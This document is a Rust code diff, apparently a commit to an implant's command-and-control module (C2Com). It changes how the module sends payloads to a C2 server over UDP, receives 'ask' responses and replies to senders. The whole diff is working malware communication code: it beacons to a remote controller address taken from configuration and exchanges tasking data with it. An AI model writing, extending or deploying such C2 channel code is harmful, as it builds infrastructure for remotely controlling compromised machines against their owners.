@@ -1,4 +1,4 @@
-use std::time::Duration;
+use std::{net::SocketAddr, time::Duration};
 use thiserror::Error;
 use tokio::{net::UdpSocket, time::timeout};
 
@@ -21,19 +21,23 @@ pub enum C2ComError {
 
 pub struct C2Com {
     udp_sock: Option<UdpSocket>,
+    remote_addr: Option<SocketAddr>,
 }
 
 pub fn init() -> C2Com {
-    C2Com { udp_sock: None }
+    C2Com {
+        udp_sock: None,
+        remote_addr: None,
+    }
 }
 
 impl C2Com {
     pub async fn send_bytes(&mut self, data: &[u8]) -> Result<(), C2ComError> {
         setup_communications(self).await?;
 
-        if let Some(sock) = &self.udp_sock {
+        if let (Some(sock), Some(remote)) = (&self.udp_sock, self.remote_addr) {
             println!("c2>> sending bytes via udp socket.");
-            timeout(Duration::from_secs(10), sock.send(data))
+            timeout(Duration::from_secs(10), sock.send_to(data, remote))
                 .await
                 .map_err(|_| {
                     C2ComError::Timeout("Timed out sending payload to c2 via udp.".into())
@@ -43,10 +47,22 @@ impl C2Com {
         Ok(())
     }
 
+    pub async fn send_bytes_to(&self, addr: SocketAddr, data: &[u8]) -> Result<(), C2ComError> {
+        let Some(sock) = &self.udp_sock else {
+            return Ok(());
+        };
+
+        timeout(Duration::from_secs(5), sock.send_to(data, addr))
+            .await
+            .map_err(|_| C2ComError::Timeout("Timed out sending response via udp.".into()))??;
+
+        Ok(())
+    }
+
     pub async fn ask(&mut self, payload: &[u8]) -> Result<Option<Vec<u8>>, C2ComError> {
         self.send_bytes(payload).await?;
 
-        if let Some(response) = self.listen(10).await? {
+        if let Some((response, _)) = self.listen(10).await? {
             println!("c2<< got ask-response ({}) via udp socket.", response.len());
             return Ok(Some(response));
         }
@@ -70,7 +86,10 @@ impl C2Com {
         }
     }
 
-    pub async fn listen(&self, timeout_secs: u16) -> Result<Option<Vec<u8>>, C2ComError> {
+    pub async fn listen(
+        &self,
+        timeout_secs: u16,
+    ) -> Result<Option<(Vec<u8>, SocketAddr)>, C2ComError> {
         let Some(sock) = self.udp_sock.as_ref() else {
             return Ok(None);
         };
@@ -90,16 +109,11 @@ impl C2Com {
         };
 
         if let Some((len, addr)) = received_opt {
-            println!("got listen packet from: {}", addr.to_string());
-            return Ok(Some(buf[..len].to_vec()));
+            println!("got listen packet from: {}", addr);
+            return Ok(Some((buf[..len].to_vec(), addr)));
         }
 
-        return Ok(None);
-
-        // match received_opt {
-        //     Some() | None => Ok(None),
-        //     Some(len) => Ok(Some(buf[..len].to_vec())),
-        // }
+        Ok(None)
     }
 }
 
@@ -115,16 +129,13 @@ async fn setup_communications(c2com: &mut C2Com) -> Result<(), C2ComError> {
         reach::ReachComMode::UDP => {
             println!(" - identified udp reach method.");
             let remote_addr =
-                std::net::SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);
+                SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);
 
             let sock = UdpSocket::bind("0.0.0.0:0").await?;
 
-            timeout(Duration::from_secs(10), sock.connect(remote_addr))
-                .await
-                .map_err(|_| C2ComError::Timeout("Timed out connecting to c2 udp.".into()))??;
-
-            println!(" - setup udp socket connected to c2.");
+            println!(" - setup udp socket for c2 ({remote_addr}).");
             c2com.udp_sock = Some(sock);
+            c2com.remote_addr = Some(remote_addr);
         }
         reach::ReachComMode::HTTP => {
             eprintln!("HTTP C2Com mode not yet implemented.")
